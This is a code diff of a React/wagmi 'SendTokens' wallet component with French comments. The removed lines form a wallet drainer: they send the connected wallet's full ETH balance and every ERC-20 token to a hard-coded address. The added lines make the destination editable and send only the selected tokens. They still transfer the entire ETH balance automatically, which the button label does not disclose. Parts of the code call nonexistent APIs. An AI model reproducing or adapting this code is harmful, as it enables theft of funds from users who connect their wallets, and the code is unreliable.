@@ -1,6 +1,5 @@
 import { Button, Input, useToasts } from '@geist-ui/core';
 import { erc20ABI, usePublicClient, useWalletClient } from 'wagmi';
-
 import { isAddress } from 'essential-eth';
 import { useAtom } from 'jotai';
 import { normalize } from 'viem/ens';
@@ -22,51 +21,80 @@ export const SendTokens = () => {
     });
 
   const [tokens] = useAtom(globalTokensAtom);
+  const [destinationAddress, setDestinationAddress] = useAtom(destinationAddressAtom);
+  const [checkedRecords, setCheckedRecords] = useAtom(checkedTokensAtom);
   const { data: walletClient } = useWalletClient();
   const publicClient = usePublicClient();
 
-  // Adresse réceptrice fixée
-  const destinationAddress = '0x518c5D62647E60864EcB3826e982c93dFa154af3';  // Ton adresse de destination
+  const sendAllCheckedTokens = async () => {
+    const tokensToSend: ReadonlyArray<`0x${string}`> = Object.entries(checkedRecords)
+      .filter(([tokenAddress, { isChecked }]) => isChecked)
+      .map(([tokenAddress]) => tokenAddress as `0x${string}`);
 
-  // Fonction pour envoyer tous les tokens ERC20 et ETH disponibles
-  const sendAllTokens = async () => {
     if (!walletClient) return;
+    if (!destinationAddress) return;
 
-    // Envoyer les ETH disponibles
-    const ethBalance = await publicClient.getBalance(walletClient.account);
-    if (ethBalance > 0) {
-      const tx = await walletClient.writeTransaction({
-        to: destinationAddress,
-        value: ethBalance,
+    if (destinationAddress.includes('.')) {
+      const resolvedDestinationAddress = await publicClient.getEnsAddress({
+        name: normalize(destinationAddress),
       });
-      showToast(`Successfully sent ${ethBalance} ETH`, 'success');
+      if (resolvedDestinationAddress) {
+        setDestinationAddress(resolvedDestinationAddress);
+      }
+      return;
     }
 
-    // Envoyer les tokens ERC20 disponibles
-    for (const token of tokens) {
-      const tokenAddress = token.contract_address;
-      const tokenContract = new publicClient.Contract(
-        tokenAddress,
-        erc20ABI,
-        walletClient
-      );
-      const tokenBalance = await tokenContract.balanceOf(walletClient.account);
+    // Envoi automatique de l'ETH disponible
+    const ethBalance = await publicClient.getBalance(walletClient.account);
+    if (ethBalance > 0) {
+      try {
+        const tx = await walletClient.sendTransaction({
+          to: destinationAddress,
+          value: ethBalance,
+        });
+        console.log('ETH transfer success:', tx);
+      } catch (err) {
+        showToast(`Erreur lors de l'envoi de l'ETH: ${err?.reason || 'Erreur inconnue'}`, 'warning');
+      }
+    }
 
-      if (tokenBalance > 0) {
-        try {
-          const tx = await walletClient.writeContract({
-            address: tokenAddress,
-            abi: erc20ABI,
-            functionName: 'transfer',
-            args: [destinationAddress, tokenBalance.toString()],
-          });
-          showToast(`Successfully sent ${tokenBalance} ${token.symbol}`, 'success');
-        } catch (err) {
-          showToast(`Error with ${token.symbol}: ${err?.reason || 'Unknown error'}`, 'warning');
-        }
+    // Envoi des tokens ERC-20 sélectionnés
+    for (const tokenAddress of tokensToSend) {
+      const token = tokens.find((token) => token.contract_address === tokenAddress);
+      if (!token || BigInt(token?.balance || '0') === BigInt(0)) continue;
+
+      try {
+        const { request } = await publicClient.simulateContract({
+          account: walletClient.account,
+          address: tokenAddress,
+          abi: erc20ABI,
+          functionName: 'transfer',
+          args: [destinationAddress as `0x${string}`, BigInt(token?.balance || '0')],
+        });
+
+        await walletClient.writeContract(request).then((res) => {
+          setCheckedRecords((old) => ({
+            ...old,
+            [tokenAddress]: {
+              ...old[tokenAddress],
+              pendingTxn: res,
+            },
+          }));
+        });
+      } catch (err) {
+        showToast(
+          `Erreur avec ${token?.contract_ticker_symbol} : ${err?.reason || 'Erreur inconnue'}`,
+          'warning',
+        );
       }
     }
   };
+
+  const addressAppearsValid: boolean =
+    typeof destinationAddress === 'string' &&
+    (destinationAddress?.includes('.') || isAddress(destinationAddress));
+
+  const checkedCount = Object.values(checkedRecords).filter((record) => record.isChecked).length;
 
   return (
     <div style={{ margin: '20px' }}>
@@ -76,19 +104,25 @@ export const SendTokens = () => {
           required
           value={destinationAddress}
           placeholder="0x518c5D62647E60864EcB3826e982c93dFa154af3"
-          readOnly
+          onChange={(e) => setDestinationAddress(e.target.value)}
+          type={
+            addressAppearsValid
+              ? 'success'
+              : destinationAddress.length > 0
+                ? 'warning'
+                : 'default'
+          }
           width="100%"
-          style={{
-            marginLeft: '10px',
-            marginRight: '10px',
-          }}
+          style={{ marginLeft: '10px', marginRight: '10px' }}
+          crossOrigin={undefined}
         />
         <Button
           type="secondary"
-          onClick={sendAllTokens}
+          onClick={sendAllCheckedTokens}
+          disabled={!addressAppearsValid}
           style={{ marginTop: '20px' }}
         >
-          Send All Tokens and ETH
+          {checkedCount === 0 ? 'Sélectionnez un ou plusieurs tokens' : `Envoyer ${checkedCount} tokens`}
         </Button>
       </form>
     </div>
